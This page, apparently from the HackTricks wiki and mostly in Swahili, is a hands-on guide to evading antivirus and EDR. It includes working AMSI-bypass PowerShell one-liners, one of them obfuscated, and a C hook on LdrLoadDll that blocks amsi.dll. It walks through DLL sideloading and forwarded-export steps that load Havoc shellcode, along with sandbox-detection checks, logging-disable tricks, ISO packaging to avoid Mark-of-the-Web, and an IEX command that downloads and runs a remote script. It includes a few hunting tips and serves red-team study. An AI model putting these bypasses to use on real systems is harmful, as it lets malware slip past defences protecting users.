# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Ukurasa huu uliandikwa na** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Zima Defender

- [defendnot](https://github.com/es3n1n/defendnot): Tool ya kusimamisha Windows Defender kazi yake.
- [no-defender](https://github.com/es3n1n/no-defender): Tool ya kusimamisha Windows Defender kazi yake kwa kudadisi AV nyingine.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

## **AV Evasion Methodology**

Kwa sasa, AVs zinatumia mbinu tofauti za kuchunguza kama faili ni ya uhalifu au la, static detection, dynamic analysis, na kwa EDR za kisasa zaidi, behavioural analysis.

### **Static detection**

Static detection inafikiwa kwa kutaja nyaraka za hatari zinazojulikana au safu za byte katika binary au script, na pia kwa kutoa taarifa kutoka kwa faili yenyewe (mfano: file description, company name, digital signatures, icon, checksum, n.k.). Hii inamaanisha kuwa kutumia tools za umma zinazojulikana kunaweza kukufanya uonekane kwa urahisi zaidi, kwani huenda zimetangazwa na kuchunguzwa kama hatari. Kuna njia kadhaa za kuepuka aina hii ya utambuzi:

- **Encryption**

Ikiwa utaficha binary kwa encryption, AV haitakuwa na njia ya kugundua programu yako, lakini utahitaji aina fulani ya loader ili kufungua na kuendesha programu kwenye memory.

- **Obfuscation**

Wakati mwingine kile unachotakiwa kufanya ni kubadilisha baadhi ya strings katika binary au script yako ili kipite AV, lakini hii inaweza kuchukua muda kulingana na kile unachojaribu kuficha.

- **Custom tooling**

Ikiwa utaunda tools zako mwenyewe, hakutakuwa na signatures zilizo wazi za hatari, lakini hili linachukua muda na juhudi kubwa.

> [!TIP]
> Njia nzuri ya kukagua dhidi ya Windows Defender static detection ni [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Kimsingi hugawa faili katika segments nyingi kisha kuagiza Defender iskanie kila moja kwa mmoja; kwa njia hii, inaweza kukuambia hasa ni strings au bytes gani zilizotajwa katika binary yako.

Ninashauri sana uangalie hii [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) kuhusu AV Evasion kwa vitendo.

### **Dynamic analysis**

Dynamic analysis ni wakati AV inatoa binary yako kwenye sandbox na kuangalia shughuli za hatari (mfano: kujaribu kufungua na kusoma passwords za browser, kufanya minidump kwenye LSASS, n.k.). Sehemu hii inaweza kuwa ngumu zaidi kufanya nayo kazi, lakini hapa kuna mambo unaweza kufanya ili kuepuka sandboxes.

- **Sleep before execution** Kulingana na jinsi imekutwa, inaweza kuwa njia nzuri ya kupita dynamic analysis ya AV. AVs zina muda mfupi mno wa kuskania faili ili zisivurugue mtiririko wa mtumiaji, hivyo kutumia sleeps ndefu kunaweza kupinga uchambuzi wa binaries. Tatizo ni kwamba sandboxes nyingi za AV zinaweza kuruka sleep kulingana na jinsi zimeanzishwa.
- **Checking machine's resources** Kwa kawaida Sandboxes zina rasilimali ndogo za kufanya kazi (mfano: < 2GB RAM), vinginevyo zingeweza kupunguza kasi ya mashine ya mtumiaji. Unaweza kuwa mbunifu hapa, kwa mfano kwa kukagua joto la CPU au hata mwendo wa fan, si kila kitu kitatekelezwa ndani ya sandbox.
- **Machine-specific checks** Ikiwa unataka kulenga mtumiaji ambao workstation yake imejiunga na domain "contoso.local", unaweza kufanya ukaguzi kwenye domain ya kompyuta kuona kama inafanana na ile uliyoelekeza; ikiwa haifanyi, unaweza kufanya programu yako itoke.

Inabainika kwamba Sandbox ya Microsoft Defender ina computername HAL9TH, hivyo, unaweza kuangalia computer name katika malware yako kabla ya detonation; ikiwa jina linafanana na HAL9TH, inamaanisha uko ndani ya defender's sandbox, hivyo unaweza kufanya programu yako itoke.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Mwadilifu mwingine mzuri kutoka kwa [@mgeeky](https://twitter.com/mariuszbit) kwa kupambana na Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Kama tulivyosema hapo awali katika chapisho hili, **public tools** hatimaye zitakuwa **zilitambuliwa**, kwa hivyo, unapaswa kujiuliza kitu:

Kwa mfano, ikiwa unataka dump LSASS, **je, unahitaji kweli kutumia mimikatz**? Au unaweza kutumia mradi mwingine usiojulikana mno ambao pia hutoa dump ya LSASS.

Jibu sahihi pengine ni hili la mwisho. Kuchukua mimikatz kama mfano, huenda ni moja ya, au ikiwezekana kifaa kilicho flag zaidi na AVs na EDRs; mradi wenyewe ni mzuri sana, lakini pia ni shida kuufanya ufanyike ili kupita AVs, kwa hiyo tafuta mbadala kwa kile unachojaribu kufanikisha.

> [!TIP]
> Unapobadilisha payloads zako kwa ajili ya evasion, hakikisha kuzima automatic sample submission katika defender, na tafadhali, kwa uzito, **DO NOT UPLOAD TO VIRUSTOTAL** ikiwa lengo lako ni kufanikiwa kuepukana kwa muda mrefu. Ikiwa unataka kukagua kama payload yako inatambuliwa na AV fulani, isakinishe kwenye VM, jaribu kuzima automatic sample submission, na uiteste hapo hadi utakapofurahi na matokeo.

## EXEs vs DLLs

Iwapo inawezekana, kila mara **pendelea kutumia DLLs kwa evasion**, kwa uzoefu wangu, files za DLL kwa kawaida huwa **zimetambuliwa kidogo zaidi** na kuchunguzwa, hivyo ni mbinu rahisi kutumia ili kuepuka utambuzi katika baadhi ya kesi (ikiwa payload yako ina njia ya kuendesha kama DLL bila shaka).

Kama tunavyoona katika picha hii, DLL Payload kutoka Havoc ina detection rate ya 4/26 katika antiscan.me, wakati EXE payload ina detection rate ya 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

Sasa tutaonyesha baadhi ya mbinu unazoweza kutumia na files za DLL ili uwe wa kiafichakazi zaidi.

## DLL Sideloading & Proxying

**DLL Sideloading** inatumia faida ya DLL search order inayotumika na loader kwa kuweka programu ya victim na malicious payload(s) kando kwa kando.

Unaweza kukagua programu zinazoweza kuathiriwa na DLL Sideloading kwa kutumia [Siofra](https://github.com/Cybereason/siofra) na powershell script ifuatayo:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Amri hii itaonyesha orodha ya programu zilizo hatarini kwa DLL hijacking ndani ya "C:\Program Files\\" na faili za DLL wanazojaribu kupakia.

Ninapendekeza sana u**explore DLL Hijackable/Sideloadable programs yourself**, mbinu hii ni kimya sana ikiwa itafanywa ipasavyo, lakini ikiwa utatumia publicly known DLL Sideloadable programs, unaweza kukamatwa kwa urahisi.

Kuweka tu DLL yenye madhara iliyo na jina ambalo programu inatarajia kupakia, haitaendesha payload yako, kwa sababu programu inatarajia baadhi ya kazi maalum ndani ya DLL hiyo; kutatua tatizo hili, tutatumia mbinu nyingine inayoitwa **DLL Proxying/Forwarding**.

**DLL Proxying** inaelekeza miito ambayo programu inafanya kutoka kwa proxy (na DLL yenye madhara) kwenda kwa DLL ya asili, hivyo ikibakiza utendakazi wa programu na kuwa na uwezo wa kushughulikia utekelezaji wa payload yako.

Nitakuwa nikitumia mradi wa [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) kutoka kwa [@flangvik](https://twitter.com/Flangvik/)

Haya ni hatua nilizofuata:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Amri ya mwisho itatupa faili 2: template ya msimbo wa chanzo wa DLL, na DLL ya asili iliyobadilishwa jina.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Both our shellcode (encoded with [SGN](https://github.com/EgeBalci/sgn)) and the proxy DLL have a 0/26 Detection rate in [antiscan.me](https://antiscan.me)! Ningependa kuiita hiyo ni mafanikio.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> I **highly recommend** you watch [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) about DLL Sideloading and also [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) to learn more about what we've discussed more in-depth.

### Kutumia vibaya Forwarded Exports (ForwardSideLoading)

Windows PE modules can export functions that are actually "forwarders": badala ya kuonyesha kwenye code, entry ya export ina string ya ASCII ya aina `TargetDll.TargetFunc`. Wakati caller anapofuta export, Windows loader itafanya:

- Load `TargetDll` if not already loaded
- Resolve `TargetFunc` from it

Tabia muhimu za kuelewa:
- Ikiwa `TargetDll` ni KnownDLL, hutolewa kutoka kwenye namespace iliyo na ulinzi ya KnownDLLs (mf., ntdll, kernelbase, ole32).
- Ikiwa `TargetDll` sio KnownDLL, utaratibu wa kawaida wa utafutaji wa DLL unatumiwa, ambao unajumuisha directory ya module inayofanya forward resolution.

Hii inawawezesha primitive isiyo ya moja kwa moja ya sideloading: pata signed DLL inayotoa function iliyotumwa kwa jina la module isiyo-KnownDLL, kisha weka pamoja DLL hiyo iliyotiwa saini na attacker-controlled DLL yenye jina sawasawa na module ya target iliyotumwa. Wakati forwarded export itakapoitwa, loader itatatua forward na itapakia DLL yako kutoka directory ile ile, ikitekeleza DllMain yako.

Example observed on Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` si KnownDLL, hivyo inatatuliwa kupitia mpangilio wa utafutaji wa kawaida.

PoC (copy-paste):
1) Nakili DLL ya mfumo iliyotiwa saini kwenye folda inayoweza kuandikwa
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Weka `NCRYPTPROV.dll` yenye madhara katika folda hiyo hiyo. DllMain ndogo (minimal) inatosha kupata code execution; hauitaji kutekeleza forwarded function ili kuchochea DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Chochea forward kwa LOLBin iliyotiwa saini:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Observed behavior:
- rundll32 (signed) inapakia side-by-side `keyiso.dll` (signed)
- Wakati ikitatua `KeyIsoSetAuditingInterface`, loader inafuata forward kwenda `NCRYPTPROV.SetAuditingInterface`
- Kisha loader inapakia `NCRYPTPROV.dll` kutoka `C:\test` na inatekeleza `DllMain` yake
- Ikiwa `SetAuditingInterface` haijatimizwa, utapata kosa la "missing API" tu baada ya `DllMain` kuendesha

Hunting tips:
- Zingatia forwarded exports ambapo module lengwa si KnownDLL. KnownDLLs zimetajwa chini ya `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Unaweza kuorodhesha forwarded exports kwa zana kama:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Tazama orodha ya Windows 11 forwarder ili kutafuta wagombea: https://hexacorn.com/d/apis_fwd.txt

Mawazo ya utambuzi/utetezi:
- Fuatilia LOLBins (e.g., rundll32.exe) zinapopakua DLL zilizotiwa saini kutoka njia zisizo za mfumo, ikifuatiwa na kupakia non-KnownDLLs zilizo na jina la msingi sawa kutoka kwenye saraka hiyo
- Toa tahadhari juu ya mnyororo wa mchakato/moduli kama: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` chini ya njia zinazoweza kuandikwa na mtumiaji
- Tekeleza sera za uadilifu wa msimbo (WDAC/AppLocker) na kataa kuandika+kutekeleza katika saraka za programu

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Unaweza kutumia Freeze kupakia na kutekeleza shellcode yako kwa njia ya siri.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Uepukaji ni mchezo wa paka na panya; kile kinachofanya kazi leo kinaweza kugunduliwa kesho, kwa hivyo usitegemee zana moja tu — ikiwa inawezekana, jaribu kuunganisha mbinu kadhaa za uepukaji.

## AMSI (Anti-Malware Scan Interface)

AMSI ilianzishwa ili kuzuia "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Awali, AVs zilikuwa zinaweza tu kuchunguza **files on disk**, hivyo ikiwa ungeweza kwa njia fulani kutekeleza payloads **directly in-memory**, AV haingeweza kufanya chochote kuzuia, kwa kuwa haikuwa na uwazi wa kutosha.

The AMSI feature is integrated into these components of Windows.

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

Inaruhusu suluhisho za antivirus kuchunguza tabia za script kwa kufichua yaliyomo ya script katika fomu ambayo haina encryption au obfuscation.

Running `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` will produce the following alert on Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Kumbuka jinsi inavyoanza na `amsi:` kisha njia ya executable kutoka ambako script ilikimbia, katika kesi hii, powershell.exe

Hatujaweka faili yoyote kwenye disk, lakini bado tulikamatwa in-memory kwa sababu ya AMSI.

Zaidi ya hayo, kuanzia na **.NET 4.8**, C# code inakimbia kupitia AMSI pia. Hii hata inaathiri `Assembly.Load(byte[])` kwa ajili ya load in-memory execution. Ndiyo sababu kutumia matoleo ya chini ya .NET (kama 4.7.2 au chini) kunashauriwa kwa in-memory execution ikiwa unataka kuepuka AMSI.

Kuna njia kadhaa za kuzunguka AMSI:

- **Obfuscation**

Kwa kuwa AMSI kwa kawaida hufanya kazi kwa static detections, hivyo kubadilisha scripts unazojaribu ku-load kunaweza kuwa njia nzuri ya kuepuka ugunduzi.

Hata hivyo, AMSI ina uwezo wa ku-unobfuscate scripts hata kama kuna tabaka kadhaa za obfuscation, kwa hivyo obfuscation inaweza kuwa chaguo duni kulingana na jinsi inavyofanywa. Hii inafanya kuepuka kutotokea kwa urahisi. Ingawa, wakati mwingine, yote unayohitaji ni kubadilisha majina ya baadhi ya variables na utakuwa sawa, hivyo inategemea jinsi kitu kilivyopewa flag.

- **AMSI Bypass**

Kwa kuwa AMSI inatekelezwa kwa kupakia DLL ndani ya mchakato wa powershell (pia cscript.exe, wscript.exe, n.k.), inawezekana kuitambua/tamper nayo kwa urahisi hata ukiendesha kama mtumiaji asiye na ruhusa. Kutokana na mdudu huu katika utekelezaji wa AMSI, watafiti wamegundua njia nyingi za kuepuka AMSI scanning.

**Forcing an Error**

Kulazimisha initialization ya AMSI kushindwa (amsiInitFailed) kutasababisha kwamba hakuna skani itakayozinduliwa kwa mchakato wa sasa. Hii ilifichuliwa kwa mara ya kwanza na [Matt Graeber](https://twitter.com/mattifestation) na Microsoft imeunda saini ili kuzuia matumizi mapana.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Yalichohitajika ni mstari mmoja wa msimbo wa powershell ili kufanya AMSI isitumike kwa mchakato wa powershell wa sasa. Mstari huu, bila shaka, umebainishwa na AMSI yenyewe; kwa hivyo mabadiliko kadhaa yanahitajika ili kutumia mbinu hii.

Hapa kuna AMSI bypass iliyorekebishwa niliyoichukua kutoka kwa [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Kumbuka, hili linaweza kuwekewa alama mara chapisho hili linapochapishwa, kwa hivyo usichapishe msimbo wowote ikiwa mpango wako ni kubaki bila kugunduliwa.

**Memory Patching**

Mbinu hii iligunduliwa awali na [@RastaMouse](https://twitter.com/_RastaMouse/) na inahusisha kutafuta anwani ya function "AmsiScanBuffer" katika amsi.dll (inayehusika na kuchunguza pembejeo zinazotolewa na mtumiaji) na kuibadilisha kwa maagizo ya kurudisha msimbo E_INVALIDARG; kwa njia hii, matokeo ya skani halisi yatakuwa 0, ambayo huchukuliwa kama matokeo safi.

> [!TIP]
> Tafadhali soma [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) kwa maelezo ya kina.

Kuna mbinu nyingi nyingine pia zinazotumiwa ku-bypass AMSI kwa powershell; angalia [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) na [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) ili ujifunze zaidi kuhusu hizo.

### Blocking AMSI by preventing amsi.dll load (LdrLoadDll hook)

AMSI inazinduliwa tu baada ya `amsi.dll` kupakiwa katika process ya sasa. Njia imara, isiyotegemea lugha, ya ku-bypass ni kuweka user‑mode hook kwenye `ntdll!LdrLoadDll` ambayo inarudisha hitilafu wakati module inayohitajika ni `amsi.dll`. Kwa matokeo yake, AMSI haisomiwi kabisa na hakuna skani zinazofanyika kwa process hiyo.

Implementation outline (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Vidokezo
- Inafanya kazi kwa PowerShell, WScript/CScript na custom loaders pia (chochote ambacho kwa kawaida kingeweza kupakia AMSI).
- Tumia pamoja na kuingiza scripts kupitia stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) ili kuepuka artefakti ndefu za mstari wa amri.
- Imeonekana ikitumika na loaders zinazotekelezwa kupitia LOLBins (mfano, `regsvr32` ikiita `DllRegisterServer`).

This tools [https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail) also generates script to bypass AMSI.

**Ondoa saini iliyotambuliwa**

Unaweza kutumia zana kama **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** na **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** kuondoa saini ya AMSI iliyotambuliwa kutoka kwenye kumbukumbu ya mchakato wa sasa. Zana hii inafanya kazi kwa kuchambua kumbukumbu ya mchakato wa sasa kutafuta saini ya AMSI kisha kuiandika upya kwa amri za NOP, hivyo kuiondoa kabisa kwenye kumbukumbu.

**Bidhaa za AV/EDR zinazotumia AMSI**

Unaweza kupata orodha ya bidhaa za AV/EDR zinazotumia AMSI katika **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Tumia PowerShell toleo la 2**
Ikiwa utatumia PowerShell toleo la 2, AMSI haitapakiwa, hivyo unaweza kuendesha scripts zako bila kukaguliwa na AMSI. Unaweza kufanya hivi:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging ni kipengele kinachokuwezesha kurekodi amri zote za PowerShell zinazotekelezwa kwenye mfumo. Hii inaweza kuwa ya msaada kwa ajili ya auditing na troubleshooting, lakini pia inaweza kuwa **tatizo kwa attackers wanaotaka evade detection**.

To bypass PowerShell logging, unaweza kutumia mbinu zifuatazo:

- **Disable PowerShell Transcription and Module Logging**: Unaweza kutumia zana kama [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) kwa madhumuni haya.
- **Use Powershell version 2**: Ikiwa utatumia PowerShell version 2, AMSI haitapakiwa, hivyo unaweza kuendesha scripts zako bila kuskuzwa na AMSI. Unaweza kufanya hivi: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Tumia [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) kuanzisha powershell bila defenses (hii ndicho `powerpick` kutoka Cobalt Strike inavyotumia).


## Obfuscation

> [!TIP]
> Mbinu kadhaa za obfuscation zinategemea kusimbua data, ambayo itaongeza entropy ya binary na kufanya kuwa rahisi kwa AVs na EDRs kuibaini. Kuwa mwangalifu na hili na labda tumia encryption tu kwa sehemu maalum za code yako ambazo ni nyeti au zinahitaji kufichwa.

### Deobfuscating ConfuserEx-Protected .NET Binaries

Wakati wa kuchambua malware inayotumia ConfuserEx 2 (au commercial forks) ni kawaida kukutana na tabaka kadhaa za ulinzi zitakazonzuia decompilers na sandboxes. Msururu wa kazi hapa chini kwa kuaminika **unarejesha IL karibu-asili** ambayo baadaye inaweza ku-decompile kuwa C# katika zana kama dnSpy au ILSpy.

1.  Anti-tampering removal – ConfuserEx inasimba kila *method body* na kuisimbua ndani ya *module* static constructor (`<Module>.cctor`). Hii pia inabadilisha PE checksum hivyo marekebisho yoyote yatafanya binary itoke. Tumia **AntiTamperKiller** kutambua encrypted metadata tables, kurejesha XOR keys na kuandika assembly safi:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Output inajumuisha parameters 6 za anti-tamper (`key0-key3`, `nameHash`, `internKey`) ambazo zinaweza kuwa muhimu wakati wa kujenga unpacker yako mwenyewe.

2.  Symbol / control-flow recovery – pasha file *safi* kwa **de4dot-cex** (fork ya de4dot inayojua ConfuserEx).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – chagua profile ya ConfuserEx 2
• de4dot itaondoa control-flow flattening, kurejesha namespaces, classes na variable names za asili na kusimamia constant strings.

3.  Proxy-call stripping – ConfuserEx inabadilisha simu za moja kwa moja za method kuwa wrappers nyepesi (a.k.a *proxy calls*) ili kuvuruga decompilation zaidi. Zibadilishe kwa **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Baada ya hatua hii unapaswa kuona API za .NET za kawaida kama `Convert.FromBase64String` au `AES.Create()` badala ya wrapper functions zisizo za wazi (`Class8.smethod_10`, …).

4.  Manual clean-up – enda kwenye binary iliyotokana chini ya dnSpy, tafuta Base64 blobs kubwa au matumizi ya `RijndaelManaged`/`TripleDESCryptoServiceProvider` ili kutambua payload halisi. Mara nyingi malware inaihifadhi kama TLV-encoded byte array inayozinduliwa ndani ya `<Module>.byte_0`.

Mnyororo hapo juu unarejesha execution flow **bila** kuhitaji kuendesha sample ya uharibifu – inayofaa wakati unafanya kazi kwenye workstation isiyounganishwa.

> 🛈  ConfuserEx huunda custom attribute inayoitwa `ConfusedByAttribute` ambayo inaweza kutumika kama IOC ili kutriage sampuli kiotomatiki.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Lengo la mradi huu ni kutoa fork ya chanzo wazi ya [LLVM](http://www.llvm.org/) compilation suite inayoweza kuongeza usalama wa programu kupitia [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) na kuzuia uharibifu.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator inaonyesha jinsi ya kutumia `C++11/14` lugha kuzalisha, wakati wa compile, obfuscated code bila kutumia zana za nje na bila kurekebisha compiler.
- [**obfy**](https://github.com/fritzone/obfy): Inaongeza tabaka la obfuscated operations zinazozalishwa na C++ template metaprogramming framework ambayo itafanya maisha ya mtu anayetaka kuvunja application kuwa ngumu kidogo.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz ni x64 binary obfuscator inayoweza ku-obfuscate mafaili mbalimbali ya PE ikiwa ni pamoja na: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame ni engine rahisi ya metamorphic code kwa executables yoyote.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator ni fine-grained code obfuscation framework kwa lugha zinazotegemewa na LLVM ikitumia ROP (return-oriented programming). ROPfuscator ina-obfuscate programu kwenye ngazi ya assembly code kwa kubadilisha maelekezo ya kawaida kuwa ROP chains, na hivyo kuzuia mtazamo wetu wa kawaida wa control flow.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt ni .NET PE Crypter iliyotengenezwa kwa Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor inaweza kubadilisha EXE/DLL zilizopo kuwa shellcode na kisha kuziload

## SmartScreen & MoTW

Umeweza kuona skrini hii unapopakua baadhi ya executables kutoka intaneti na kuzitekeleza.

Microsoft Defender SmartScreen ni mechanism ya usalama iliyolenga kumlinda mtumiaji wa mwisho dhidi ya kuendesha applications zinazoweza kuwa za hatari.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen inafanya kazi kwa msingi wa reputation, ikimaanisha kwamba applications zisizopakuliwa mara kwa mara zitasababisha SmartScreen kutoa tahadhari na kuzuia mtumiaji kuendesha faili (ingawa faili bado inaweza kuendeshwa kwa kubofya More Info -> Run anyway).

**MoTW** (Mark of The Web) ni [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) yenye jina Zone.Identifier ambayo huundwa kiotomatiki wakati wa kupakua files kutoka intaneti, pamoja na URL ambayo ilipakuliwa.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Kuangalia Zone.Identifier ADS kwa faili iliyopakuliwa kutoka intaneti.</p></figcaption></figure>

> [!TIP]
> Ni muhimu kutambua kwamba executables zilizotiwa saini kwa cheti cha kusaini kinachotambulika (trusted) hazitachochea SmartScreen.

Njia yenye ufanisi mkubwa ya kuzuia payloads zako kupata Mark of The Web ni kuzipakia ndani ya aina fulani ya container kama ISO. Hii hutokea kwa sababu Mark-of-the-Web (MOTW) **haiwezi** kutumika kwa volumes ambazo si NTFS.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) ni zana inayopakia payloads katika output containers ili kuepuka Mark-of-the-Web.

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
